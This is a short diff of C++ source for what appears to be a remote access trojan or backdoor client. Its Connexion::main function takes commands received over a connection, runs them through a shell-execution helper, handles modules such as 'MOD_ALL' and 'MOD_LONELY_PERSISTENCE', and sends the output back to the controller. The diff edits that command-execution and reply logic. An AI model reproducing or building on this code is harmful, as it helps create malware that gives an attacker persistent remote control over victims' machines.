@@ -181,12 +181,12 @@ int Connexion::main(bool is_admin, string path_prog)
                 }
 
                 cout << "FINISH ?" << endl;
-                //free(prog);
+                free(prog);
                 cout << "????" << endl;
             }
             else if(command.substr(0,8)=="MOD_ALL:")
             {
-                exec(command.substr(8,command.length()));
+                Exec().executeCommand(command.substr(8,command.length()));
                 
             }
             else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")  
@@ -207,11 +207,15 @@ int Connexion::main(bool is_admin, string path_prog)
             }
             else
             {
+                cout <<"exec gooo " << endl;
                 result = Exec().executeCommand(command);
-                cout << result << endl;
-                cout << result.length() <<endl;
-                result += getPath();
-      
+                //cout << result << endl;
+                //cout << result.length() <<endl;
+                if(command.substr(0,3) == "[-]")
+                {;} //if error not append path.
+                else
+                {result += getPath();}
+                
                 sendSafe(result);
                 
             }
